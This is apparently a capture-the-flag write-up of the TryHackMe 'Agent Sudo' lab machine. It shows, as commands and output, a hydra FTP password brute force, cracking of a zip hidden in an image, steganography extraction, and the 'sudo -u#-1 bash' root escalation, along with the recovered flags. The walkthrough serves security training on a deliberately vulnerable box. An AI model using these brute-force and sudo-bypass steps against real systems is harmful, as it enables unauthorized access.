https://tryhackme.com/room/agentsudoctf

BoxIP = 10.10.169.240

**Initial Enumeration**

    ┌──(root💀kali)-[/home/kali/agentsudo]
    └─# rustscan --ulimit 5000 -b 2500 -a 10.10.169.240 -- -A
    .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
    | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
    | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
    `-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
    The Modern Day Port Scanner.
    ________________________________________
    : https://discord.gg/GFrQsGy           :
    : https://github.com/RustScan/RustScan :
     --------------------------------------
    🌍HACK THE PLANET🌍

    [~] The config file is expected to be at "/root/.rustscan.toml"
    [~] Automatically increasing ulimit value to 5000.
    Open 10.10.169.240:21
    Open 10.10.169.240:22
    Open 10.10.169.240:80


    PORT   STATE SERVICE REASON         VERSION
    21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
    22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
    | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5hdrxDB30IcSGobuBxhwKJ8g+DJcUO5xzoaZP/vJBtWoSf4nWDqaqlJdEF0Vu7Sw7i0R3aHRKGc5mKmjRuhSEtuKKjKdZqzL3xNTI2cItmyKsMgZz+lbMnc3DouIHqlh748nQknD/28+RXREsNtQZtd0VmBZcY1TD0U4XJXPiwleilnsbwWA7pg26cAv9B7CcaqvMgldjSTdkT1QNgrx51g4IFxtMIFGeJDh2oJkfPcX6KDcYo6c9W1l+SCSivAQsJ1dXgA2bLFkG/wPaJaBgCzb8IOZOfxQjnIqBdUNFQPlwshX/nq26BMhNGKMENXJUpvUTshoJ/rFGgZ9Nj31r
    |   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
    | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHdSVnnzMMv6VBLmga/Wpb94C9M2nOXyu36FCwzHtLB4S4lGXa2LzB5jqnAQa0ihI6IDtQUimgvooZCLNl6ob68=
    |   256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
    |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOL3wRjJ5kmGs/hI4aXEwEndh81Pm/fvo8EvcpDHR5nt
    80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))


Lets start with the webserver enumeration

On the webpage we get a hint 

    Dear agents,

    Use your own codename as user-agent to access the site.

    From,
    Agent R 

    ┌──(root💀kali)-[/home/kali/agentsudo]
    └─# curl http://10.10.169.240/ -H 'User-Agent: C' -i
    HTTP/1.1 302 Found
    Date: Wed, 24 Aug 2022 19:14:19 GMT
    Server: Apache/2.4.29 (Ubuntu)
    Location: agent_C_attention.php
    Content-Length: 218
    Content-Type: text/html; charset=UTF-8



When we use the location defined we find the following text

    Attention chris,

    Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!

    From,
    Agent R 

Since that is a weakpassword let us start up a hydra on the ftp server

    ┌──(root💀kali)-[/home/kali/agentsudo]
    └─# hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.169.240 ftp
    Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

    Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-24 15:12:59
    [WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
    [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
    [DATA] attacking ftp://10.10.169.240:21/
    [STATUS] 245.00 tries/min, 245 tries in 00:01h, 14344154 to do in 975:48h, 16 active
    [21][ftp] host: 10.10.169.240   login: chris   password: crystal

Using the found username and the found password we will loginto the FTP server

    ┌──(root💀kali)-[/home/kali/agentsudo]
    └─# ftp 10.10.169.240
    Connected to 10.10.169.240.
    220 (vsFTPd 3.0.3)
    Name (10.10.169.240:kali): chris
    331 Please specify the password.
    Password: 
    230 Login successful.
    Remote system type is UNIX.
    Using binary mode to transfer files.
    ftp> ls -la
    229 Entering Extended Passive Mode (|||31346|)
    150 Here comes the directory listing.
    drwxr-xr-x    2 0        0            4096 Oct 29  2019 .
    drwxr-xr-x    2 0        0            4096 Oct 29  2019 ..
    -rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
    -rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
    -rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png


Lets grab those files

    ┌──(root💀kali)-[/home/kali/agentsudo]
    └─# cat To_agentJ.txt 
    Dear agent J,

    All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

    From,
    Agent C

Alright so we will be dealing with Stegenography. Performing a binwalk on cutie.png we find some interesting items

    ┌──(root💀kali)-[/home/kali/agentsudo]
    └─# binwalk cutie.png     

    DECIMAL       HEXADECIMAL     DESCRIPTION
    --------------------------------------------------------------------------------
    0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
    869           0x365           Zlib compressed data, best compression
    34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
    34820         0x8804          End of Zip archive, footer length: 22

    ┌──(root💀kali)-[/home/kali/agentsudo]
    └─# zip2john -s cutie.png > hash                                                                    1 ⨯
    Scanning archive for local file headers

    ┌──(root💀kali)-[/home/kali/agentsudo]
    └─# ls
    cute-alien.jpg  cutie.png  hash  hash2  hydra.restore  To_agentJ.txt

    ┌──(root💀kali)-[/home/kali/agentsudo]
    └─# cat hash
    cutie.png/To_agentR.txt:$zip2$*0*1*0*4673cae714579045*67aa*4e*61c4cf3af94e649f827e5964ce575c5f7a239c48fb992c8ea8cbffe51d03755e0ca861a5a3dcbabfa618784b85075f0ef476c6da8261805bd0a4309db38835ad32613e3dc5d7e87c0f91c0b5e64e*4969f382486cb6767ae6*$/zip2$:To_agentR.txt:cutie.png:cutie.png

    ┌──(root💀kali)-[/home/kali/agentsudo]
    └─# john hash --wordlist=/usr/share/wordlists/rockyou.txt                 
    Using default input encoding: UTF-8
    Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 AVX 4x])
    Cost 1 (HMAC size) is 78 for all loaded hashes
    Will run 4 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    alien            (cutie.png/To_agentR.txt)     


    ┌──(root💀kali)-[/home/kali/agentsudo]
    └─# stegseek cute-alien.jpg /usr/share/wordlists/rockyou.txt
    StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

    [i] Found passphrase: "Area51"           
    [i] Original filename: "message.txt"
    [i] Extracting to "cute-alien.jpg.out".
    
    
      ┌──(root💀kali)-[/home/kali/agentsudo]
    └─# steghide --extract -sf cute-alien.jpg                   
    Enter passphrase: 
    wrote extracted data to "message.txt".

    ┌──(root💀kali)-[/home/kali/agentsudo]
    └─# ls
    cute-alien.jpg  cute-alien.jpg.out  cutie.png  hash  hash2  hydra.restore  message.txt  To_agentJ.txt

    ┌──(root💀kali)-[/home/kali/agentsudo]
    └─# cat message.txt 
    Hi james,

    Glad you find this message. Your login password is hackerrules!

    Don't ask me why the password look cheesy, ask agent R who set this password for you.

    Your buddy,
    chris

     ┌──(root💀kali)-[/home/kali/agentsudo]
    └─# ssh james@10.10.169.240
    james@10.10.169.240's password: 
    Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)

     * Documentation:  https://help.ubuntu.com
     * Management:     https://landscape.canonical.com
     * Support:        https://ubuntu.com/advantage

      System information as of Wed Aug 24 19:34:58 UTC 2022

      System load:  0.0               Processes:           97
      Usage of /:   40.7% of 9.78GB   Users logged in:     0
      Memory usage: 30%               IP address for eth0: 10.10.169.240
      Swap usage:   0%


    75 packages can be updated.
    33 updates are security updates.


    Last login: Tue Oct 29 14:26:27 2019
    james@agent-sudo:~$ 


    james@agent-sudo:~$ cat user_flag.txt 
    b03d975e8c92a7c04146cfa7a5a313c7



    james@agent-sudo:/home$ sudo -l
    [sudo] password for james: 
    Matching Defaults entries for james on agent-sudo:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User james may run the following commands on agent-sudo:
        (ALL, !root) /bin/bash


    james@agent-sudo:~$ sudo -u#-1 bash
    root@agent-sudo:~# whoami
    root
    root@agent-sudo:~# cd /root
    root@agent-sudo:/root# ls
    root.txt
    root@agent-sudo:/root# cat root.txt
    To Mr.hacker,

    Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

    Your flag is 
    b53a02f55b57d4439e3341834d70c062

   



